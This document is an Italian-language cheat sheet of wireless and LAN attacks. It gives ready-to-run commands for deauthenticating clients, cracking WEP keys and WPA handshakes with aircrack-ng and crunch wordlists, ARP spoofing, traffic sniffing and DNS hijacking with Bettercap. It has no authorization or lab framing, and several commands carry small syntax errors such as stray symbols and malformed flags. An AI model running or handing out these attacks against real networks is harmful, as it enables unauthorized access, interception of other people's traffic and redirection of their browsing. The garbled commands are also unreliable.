WIRELESS NETWORKS ATTACKS


Connettere il dispositivo USB alla macchina
Collegare l'adattatore Wi-Fi USB alla macchina e verificare che il sistema operativo lo abbia correttamente rilevato.

Per visualizzare l'elenco dei dispositivi USB collegati utilizzare il comando seguente:
lsusb
Nell'elenco dei dispositivi USB verrà visualizzata una voce relativa all'adattatore collegato. Ad esempio, potrebbe comparire una voce analoga a:

TP-Link Archer T20 PLUS [RTL8821AU]

Il nome visualizzato può variare in base al modello dell'adattatore e al chipset utilizzato.

Effettuare gli aggiornamenti
Prima di procedere con l'installazione del driver è consigliabile aggiornare l'indice dei pacchetti e installare gli aggiornamenti disponibili per il sistema.
sudo apt update
sudo apt upgrade

Installare il driver
Installare il pacchetto DKMS relativo al driver dell'adattatore wireless. DKMS permette di gestire il modulo del kernel necessario al funzionamento del dispositivo.
sudo apt-get install realtek-rtl88xxau-dkms

Riavviare il sistema
Al termine dell'installazione del driver riavviare il sistema per permettere il caricamento del nuovo modulo del kernel.
sudo reboot
Identificare le interfacce di rete
Prima di effettuare qualsiasi attività è consigliabile verificare quali interfacce di rete sono presenti nel sistema.
ip link

Cambiare temporaneamente l'indirizzo MAC
È possibile modificare temporaneamente il MAC address di un'interfaccia di rete. La modifica viene normalmente persa al riavvio del sistema.
ip link set wlan0 down
ip link set wlan0 address 00:11:22:33:44:55
ip link set wlan0 up

Verificare il nuovo indirizzo MAC
ip link show wlan0

Modalità monitor
Per impostare la scheda wireless in modalità monitor eseguire i seguenti comandi:
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up

Verificare la modalità dell'interfaccia
iwconfig wlan0

Analisi delle reti wireless con Airodump-ng
Airodump-ng può essere utilizzato per visualizzare le reti wireless rilevabili e raccogliere informazioni radio come BSSID, canale e potenza del segnale.
airodump-ng wlan0

Esecuzione Airodump-ng con limitazione di banda
airodump-ng --band g wlan0
airodump-ng --band abg wlan0

Dove:

  • a → 5 GHz
  • b → 2,4 GHz (802.11b)
  • g → 2,4 GHz (802.11g)

Salvare i risultati dell'analisi
Airodump-ng può salvare i risultati della scansione, saranno generati 3 file con estensione .csv, .cap (wireshark), .netxml.
airodump-ng --bssid nome_bssid --channel numero_canale --write nome_file wlan0

Deauthentication attack
Impostare Airodump-ng in esecuzione su un'altra finestra ed eseguire il seguente comando:
aireplay-ng --deauth numero_elevato -a MAC_access_point> -c MAC_dispositivo_target -wlan0

Wi-fi password guessing - base
Inizialmente potrebbero non esserci abbastanza pacchetti disponibili, in questo caso occorre generare inizialmente dei pacchetti:
aireplay-ng --fakeauth 0 -a MAC_access_point --h MAC_wlan0 wlan0
Dopo aver intercettato un gran numero di pacchetti con Airodump-ng e generato il file .cap eseguire:
aircrack-ng file.cap
(nella stringa ottenuta non considerare il simbolo ':')

Wi-fi password guessing - chop-chop
Aprire 4 finestre del terminale eseguendo i seguenti comandi:
1a finestra:
airodump-ng --bssid nome_bssid --channel numero_canale --write file_output wlan0
2a finestra:
aireplay-ng --fakeauth 0 -a MAC_access_point> --h MAC_wlan0 wlan0
3a finestra (genera file outfile.xor):
aireplay-ng --chopchop -b MAC_access_point -h MAC_wlan0 wlan0
4a finestra (prende in input outfile.xor generato su finestra 3):
packetforge-ng -0 -a MAC_access_point --h MAC_wlan0 -k 255.255.255.255 -l 255.255.255.255 -y outfile.xor -w forged_packet_outfile
Eseguire quindi:
aircrack-ng forged_packet_outfile

Packet injection fragmentation attack
Aprire 3 finestre del terminale eseguendo i seguenti comandi:
1a finestra:
airodump-ng --bssid nome_bssid --channel numero_canale --write outfile wlan0
2a finestra:
aireplay-ng --fakeauth 0 -a MAC_access_point --h MAC_wlan0 wlan0
3a finestra:
aireplay-ng --fragment -b MAC_access_point -h MAC_wlan0 wlan0

Brute force Wi-fi password
Step 1: creazione di un dizionario (crea un file .txt contenente tutte le stringhe contenenti tra 6 e 8 caratteri uguali a 1/2/3/a/b/c/$ nella forma a_____b):
crunch 6 8 123abc$ -o outfile.txt -t a@@@@b
Step 2: cattura handshake (verrà forzato l'handshake mediante deauth):
1a finestra:
airodump-ng --bssid nome_bssid --channel numero_canale --write output_file wlan0
2a finestra:
aireplay-ng --deauth 4 -a MAC_access_point -c MAC_dispositivo_target -wlan0
Step 3: test password ( in base al file .cap generato nello step 2 proverà tutte le password generate nello step 1)
aircrack-ng outfile.cap -w outfile.txt wlan0

Discovery della rete
Per scoprire quali dispositivi sono presenti e rispondono all'interno di una rete locale, utilizzando principalmente richieste ARP:
netdiscover -r IP_rete/bit_rete

ARP spoofing
Per inviare risposte ARP contraffatte per alterare l'associazione tra indirizzi IP e MAC address nella rete locale:
arpspoof -i wlan0 -t IP_client IP_gateway

Packet sniffing con Bettercap
Step 1: creare uno script di sniffing denominato "spoof.cap" contenente i seguenti comandi:
net.probe on
net.recon on
set set arp.spoof.fullduplex true
set arp.spoof.targets IP_target
arp.spoof on
set net.sniff.local true
net.sniff on
Step 2: eseguire lo script con Bettercap:
bettercap -iface wlan0 -caplet spoof.cap

ARP poisoning con Bettercap
Eseguire sequenzialmente i seguenti comandi per forzare l'host target ad inviare all'attaccante i dati destinati al router:
bettercap
set arp.spoof.fullduplex true
set arp.spoof.targets IP_target
arp.spoof on
net.show

DNS spoofing con Bettercap
Step 1: avviare il server http Apache (homepage /var/www/html/index.html):
service apache2 start
Step 2: creare uno script di sniffing denominato "dnsspoof.cap" contenente i seguenti comandi:
dns.spoof on
set dns.spoof.all true
set dns.spoof.domains dominio da dirottare_1,dominio da dirottare_2
dns.spoof on
Step 3: eseguire lo script con Bettercap:
bettercap -iface wlan0 -caplet dnsspoof.cap
